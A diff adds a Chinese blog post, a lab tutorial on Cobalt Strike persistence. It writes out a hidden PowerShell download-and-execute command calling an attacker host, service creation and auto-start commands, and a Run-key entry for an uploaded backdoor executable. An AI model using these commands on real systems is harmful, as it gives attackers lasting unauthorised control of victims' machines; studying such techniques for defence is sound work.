@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="在渗透过程中拿到目标权限只是开始，如果管理员修复了漏洞权限就丢失了，这时候要想持续在内网进行渗透就需要权限维持。了解cs的权限维持的手段，熟悉win下注册表、开机启动项以及各种渗透中常见的命令。">
+<meta name="keywords" content="CobaltStrike">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CobaltStrike学习五">
+<meta property="og:url" content="https://alpha302.github.io/2019/10/16/CobaltStrike学习五/index.html">
+<meta property="og:site_name" content="Alpha的小站">
+<meta property="og:description" content="在渗透过程中拿到目标权限只是开始，如果管理员修复了漏洞权限就丢失了，这时候要想持续在内网进行渗透就需要权限维持。了解cs的权限维持的手段，熟悉win下注册表、开机启动项以及各种渗透中常见的命令。">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/alpha302/cloudimg/master/%7DI%40FX2R7%7DWHI.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/alpha302/cloudimg/master/NJHB%7B%607%7D4%60XM8L%5B%60NIE0V.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/alpha302/cloudimg/master/5%603KM2TO1C%7D%7EQRV%7B8174.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/alpha302/cloudimg/master/E6137CE.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/alpha302/cloudimg/master/%602%5BPYJY%7B_MZN%5B%7EZ9M%60BBE.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/alpha302/cloudimg/master/EPPCW8AG%40AZT5.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/alpha302/cloudimg/master/%7B%256FN54XMS_B1GJ%7BSQFP9Q5.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/alpha302/cloudimg/master/L%7ERK9V%24I_%7BO7%7E%7BZ%7EB2WE%24GI.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/alpha302/cloudimg/master/NQHR0%7BQO5%40T.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/alpha302/cloudimg/master/4%7BOPA%25%7D%409PR09%5B4MH%5BVPQS7.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/alpha302/cloudimg/master/H_%4019B%7E2%24U%5D61LJ%5DS3RBQ%25I.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/alpha302/cloudimg/master/RA3JHISUG%5BM6FMGFIK%7ESX%7BS.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/alpha302/cloudimg/master/FWCQIBD6N%24FLE.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/alpha302/cloudimg/master/_219%7D3LE410%5B8K06A8KL389.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/alpha302/cloudimg/master/K2%40O5Y3MW4BFL1W%60I.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/alpha302/cloudimg/master/HJN9OLVEC75MQ_2CH.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/alpha302/cloudimg/master/4%259GFI7S%7DP%7ER%25AZ%24ZJ.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/alpha302/cloudimg/master/headImg.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/alpha302/cloudimg/master/headImg2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/alpha302/cloudimg/master/headImg3.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/alpha302/cloudimg/master/headImg4.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/alpha302/cloudimg/master/headImg5.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/alpha302/cloudimg/master/headImg6.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/alpha302/cloudimg/master/headImg7.png">
+<meta property="og:updated_time" content="2019-10-16T13:30:54.004Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CobaltStrike学习五">
+<meta name="twitter:description" content="在渗透过程中拿到目标权限只是开始，如果管理员修复了漏洞权限就丢失了，这时候要想持续在内网进行渗透就需要权限维持。了解cs的权限维持的手段，熟悉win下注册表、开机启动项以及各种渗透中常见的命令。">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/alpha302/cloudimg/master/%7DI%40FX2R7%7DWHI.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>CobaltStrike学习五</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives">Writing</a></li>
+         
+          <li><a href="/music">Music</a></li>
+         
+          <li><a href="/about">关于</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2019/10/16/CobaltStrike学习四/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://alpha302.github.io/2019/10/16/CobaltStrike学习五/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://alpha302.github.io/2019/10/16/CobaltStrike学习五/&text=CobaltStrike学习五"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://alpha302.github.io/2019/10/16/CobaltStrike学习五/&title=CobaltStrike学习五"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://alpha302.github.io/2019/10/16/CobaltStrike学习五/&is_video=false&description=CobaltStrike学习五"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CobaltStrike学习五&body=Check out this article: https://alpha302.github.io/2019/10/16/CobaltStrike学习五/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://alpha302.github.io/2019/10/16/CobaltStrike学习五/&title=CobaltStrike学习五"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://alpha302.github.io/2019/10/16/CobaltStrike学习五/&title=CobaltStrike学习五"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://alpha302.github.io/2019/10/16/CobaltStrike学习五/&title=CobaltStrike学习五"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://alpha302.github.io/2019/10/16/CobaltStrike学习五/&title=CobaltStrike学习五"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://alpha302.github.io/2019/10/16/CobaltStrike学习五/&name=CobaltStrike学习五&description=&lt;p&gt;在渗透过程中拿到目标权限只是开始，如果管理员修复了漏洞权限就丢失了，这时候要想持续在内网进行渗透就需要权限维持。了解cs的权限维持的手段，熟悉win下注册表、开机启动项以及各种渗透中常见的命令。&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#设置powershell脚本开机自启动后门"><span class="toc-number">1.</span> <span class="toc-text">设置powershell脚本开机自启动后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#通过service留自启动后门，生成一个exe后门"><span class="toc-number">2.</span> <span class="toc-text">通过service留自启动后门，生成一个exe后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#也可以直接向注册表写开机启动项"><span class="toc-number">3.</span> <span class="toc-text">也可以直接向注册表写开机启动项</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        CobaltStrike学习五
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Alpha的小站</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2019-10-16T11:34:22.000Z" itemprop="datePublished">2019-10-16</time>
+    </div>
+
+
+      
+    <span class="article-categories">
+        分类：<a class="category-link" href="/categories/工具使用/">工具使用</a>
+    </span>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/CobaltStrike/">CobaltStrike</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>在渗透过程中拿到目标权限只是开始，如果管理员修复了漏洞权限就丢失了，这时候要想持续在内网进行渗透就需要权限维持。了解cs的权限维持的手段，熟悉win下注册表、开机启动项以及各种渗透中常见的命令。</p>
+<a id="more"></a>
+
+<hr>
+<h2 id="设置powershell脚本开机自启动后门"><a href="#设置powershell脚本开机自启动后门" class="headerlink" title="设置powershell脚本开机自启动后门"></a>设置powershell脚本开机自启动后门</h2><p>点击Attacks-&gt;web driver-by -&gt;script web delivery<br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/%7DI%40FX2R7%7DWHI.png" alt></p>
+<p>点击launch后出现如下<br>将其复制到靶机的cmd运行即可<br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/NJHB%7B%607%7D4%60XM8L%5B%60NIE0V.png" alt></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.1.1.100:81/a'))"</span><br></pre></td></tr></table></figure>
+
+<p>此时拿到了普通用户权限的beacon，首先提权到system权限<br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/5%603KM2TO1C%7D%7EQRV%7B8174.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/E6137CE.png" alt></p>
+<p>打开beacon shell后输入：</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">shell</span> <span class="keyword">sc</span> create <span class="string">"name"</span> binpath= <span class="string">"cmd /c start powershell.exe -nop -w hidden -c \"</span>IEX ((new-object <span class="keyword">net</span>.webclient).downloadstring('http:<span class="comment">//10.1.1.100:81/a'))\""</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/%602%5BPYJY%7B_MZN%5B%7EZ9M%60BBE.png" alt></p>
+<p>切换到靶机，查看服务，<br>在服务中找到了名为name的项<br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/EPPCW8AG%40AZT5.png" alt></p>
+<p>注意到此时启动类型还是手动，我们设置为自动<br>回到beacon shell输入以下命令即可</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell sc<span class="built_in"> config </span><span class="string">"name"</span> start= auto</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/%7B%256FN54XMS_B1GJ%7BSQFP9Q5.png" alt></p>
+<p>在服务中右键-》刷新<br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/L%7ERK9V%24I_%7BO7%7E%7BZ%7EB2WE%24GI.png" alt></p>
+<p>设置服务的描述字符串<br>shell sc description “name” “description”</p>
+<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/NQHR0%7BQO5%40T.png" alt></p>
+<p>再次刷新，可以看到此时在name的属性中看到了描述为description<br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/4%7BOPA%25%7D%409PR09%5B4MH%5BVPQS7.png" alt></p>
+<p>接下来启动服务</p>
+<p>shell net start “name”</p>
+<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/H_%4019B%7E2%24U%5D61LJ%5DS3RBQ%25I.png" alt></p>
+<p>然后重启靶机<br>此时看到已有的会话已经失去了连接<br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/RA3JHISUG%5BM6FMGFIK%7ESX%7BS.png" alt></p>
+<p>不过通过powershell留开机自启动服务，当目标主机重启电脑之后,不断向攻击机器发送请求数据包，重新拿到控制权限</p>
+<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/FWCQIBD6N%24FLE.png" alt></p>
+<h2 id="通过service留自启动后门，生成一个exe后门"><a href="#通过service留自启动后门，生成一个exe后门" class="headerlink" title="通过service留自启动后门，生成一个exe后门"></a>通过service留自启动后门，生成一个exe后门</h2><p>Attacks-&gt;packages-&gt;windows executable</p>
+<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/_219%7D3LE410%5B8K06A8KL389.png" alt></p>
+<p>保存即可,<br>然后右键explore&gt;file browser</p>
+<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/K2%40O5Y3MW4BFL1W%60I.png" alt></p>
+<p>把生成的exe程序上传到靶机<br>选择我们想要的路径，这里以C:\windows为例<br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/HJN9OLVEC75MQ_2CH.png" alt></p>
+<p>点击upload，选择artifact.exe<br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/4%259GFI7S%7DP%7ER%25AZ%24ZJ.png" alt></p>
+<p>点击打开即可<br>在靶机上就能看到了</p>
+<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/headImg.png" alt></p>
+<p>创建项及路径<br>shell sc create “server power” binpath= “C:\Windows\artifact.exe”</p>
+<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/headImg2.png" alt></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">设置服务的描述字符串</span><br><span class="line">shell sc description <span class="string">"server power"</span> <span class="string">"description"</span></span><br><span class="line"></span><br><span class="line">设置服务为自启动</span><br><span class="line">shell sc<span class="built_in"> config </span><span class="string">"server power"</span> start= auto</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/headImg3.png" alt></p>
+<p>然后启动服务<br>shell net start “server power”</p>
+<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/headImg4.png" alt></p>
+<h2 id="也可以直接向注册表写开机启动项"><a href="#也可以直接向注册表写开机启动项" class="headerlink" title="也可以直接向注册表写开机启动项"></a>也可以直接向注册表写开机启动项</h2><p>还是用上一步生成的木马程序</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell reg add HKLM<span class="symbol">\S</span>OFTWARE<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows<span class="symbol">\C</span>urrentVersion<span class="symbol">\R</span>un /v "keyname" /t REG_SZ /d "C:<span class="symbol">\W</span>indows<span class="symbol">\a</span>rtifact.exe" /f</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/headImg5.png" alt></p>
+<p>切换到靶机，打开注册表<br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/headImg6.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/headImg7.png" alt></p>
+<p>靶机重启之后，在cs同样是自动拿到了控制权限</p>
+
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives">Writing</a></li>
+         
+          <li><a href="/music">Music</a></li>
+         
+          <li><a href="/about">关于</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#设置powershell脚本开机自启动后门"><span class="toc-number">1.</span> <span class="toc-text">设置powershell脚本开机自启动后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#通过service留自启动后门，生成一个exe后门"><span class="toc-number">2.</span> <span class="toc-text">通过service留自启动后门，生成一个exe后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#也可以直接向注册表写开机启动项"><span class="toc-number">3.</span> <span class="toc-text">也可以直接向注册表写开机启动项</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://alpha302.github.io/2019/10/16/CobaltStrike学习五/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://alpha302.github.io/2019/10/16/CobaltStrike学习五/&text=CobaltStrike学习五"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://alpha302.github.io/2019/10/16/CobaltStrike学习五/&title=CobaltStrike学习五"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://alpha302.github.io/2019/10/16/CobaltStrike学习五/&is_video=false&description=CobaltStrike学习五"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CobaltStrike学习五&body=Check out this article: https://alpha302.github.io/2019/10/16/CobaltStrike学习五/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://alpha302.github.io/2019/10/16/CobaltStrike学习五/&title=CobaltStrike学习五"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://alpha302.github.io/2019/10/16/CobaltStrike学习五/&title=CobaltStrike学习五"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://alpha302.github.io/2019/10/16/CobaltStrike学习五/&title=CobaltStrike学习五"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://alpha302.github.io/2019/10/16/CobaltStrike学习五/&title=CobaltStrike学习五"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://alpha302.github.io/2019/10/16/CobaltStrike学习五/&name=CobaltStrike学习五&description=&lt;p&gt;在渗透过程中拿到目标权限只是开始，如果管理员修复了漏洞权限就丢失了，这时候要想持续在内网进行渗透就需要权限维持。了解cs的权限维持的手段，熟悉win下注册表、开机启动项以及各种渗透中常见的命令。&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 wang
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives">Writing</a></li>
+         
+          <li><a href="/music">Music</a></li>
+         
+          <li><a href="/about">关于</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":120,"height":240},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/fontawesome-all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
